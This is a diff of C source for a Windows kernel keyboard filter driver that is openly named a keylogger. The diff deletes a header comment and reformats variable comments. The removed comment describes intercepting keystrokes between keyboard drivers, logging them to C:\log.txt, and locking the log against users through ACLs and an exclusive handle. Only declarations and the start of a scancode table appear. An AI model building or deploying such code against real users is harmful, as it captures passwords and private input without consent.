@@ -1,64 +1,19 @@
 #include "keylogger.h"
-
-/**
- *
- * KeyLogger
- *
- * Simple Key Logger KMDF Driver.
- *
- * Author: Adrianna Piekarska
- *
- * Description:
- *
- *	Driver that hooks itself between the KbdClass driver and i8042prt driver
- *	and intercepts keystrokes. Intercepted data is written to a log file,
- *	which default location is C:\log.txt. Writing to the file is being done
- *	by the separate system worker thread. The driver creates the worker and
- *	later uses it whenever there is enough data in the buffer. The trigger
- *	point for writing the data can be set by modifying the LOG_TRIGGER_POINT
- *	define directive. Because the keystrokes are written to file in the
- *	blocks of fixed size, there is a possibility of the logger being unable
- *	to record last keystrokes in case of driver being unloaded when the buffer
- *	is not full. This problem can be overcome by setting LOG_TRIGGER_POINT
- *	to 1. However then disk access frequency increases.
- *
- *	The log file is protected from accessing by any user by configuring the
- *	proper Discretionary Access Control List. This however does not prevent
- *  system administrator to take ownership of the file. But even then, the
- *	file cannot be accessed by anyone during the lifetime of the driver as
- *	the driver keeps the handle to the file open and unaccessible to other
- *	processes (by specyfing the exclusive access to the created file).
- *
- *  Due to the fact that the driver unload routine in case of PnP drivers
- *	can be called at any time after the device is removed (and it seems that
- *  it is called only when the new driver is being loaded in the place of the
- *	previous one), the permissions of the log file must be reset manually so
- *	that the contents of the log can be examined.
- *
- *	Based on Microsofts' kbfilter driver.
- *
- **/
-
 #ifdef ALLOC_PRAGMA
 #pragma alloc_text (INIT, DriverEntry)
 #pragma alloc_text (PAGE, KeyLogger_EvtDeviceAdd)
 #pragma alloc_text (PAGE, KeyLogger_EvtIoInternalDeviceControl)
 #endif
 
-HANDLE				fileHandle;				// Handle for the log file.
-											// Remains open throughout
-											// the driver's lifetime.
+HANDLE				fileHandle;		// Handle for the log file. Remains open throughout the driver's lifetime.
 
-KEYBOARD_DATA_ARRAY keyboardDataArray;		// Structure that holds the
-											// global array.
+KEYBOARD_DATA_ARRAY 		keyboardDataArray;	// Structure that holds the global array.
 
-ULONG				written;				// Total number of records
-											// written to the file.
+ULONG				written;		// Total number of records written to the file.
 
-#define				LOG_TRIGGER_POINT 16	// Value at which the writing
-											// work item fires.
+#define				LOG_TRIGGER_POINT 16	// Value at which the writing work item fires.
 
-#define				SZ_KEYTABLE 0x53		// Size of the scancodes table.
+#define				SZ_KEYTABLE 0x53	// Size of the scancodes table.
 
 char* keytable[SZ_KEYTABLE] =				// Scancodes table.
 {
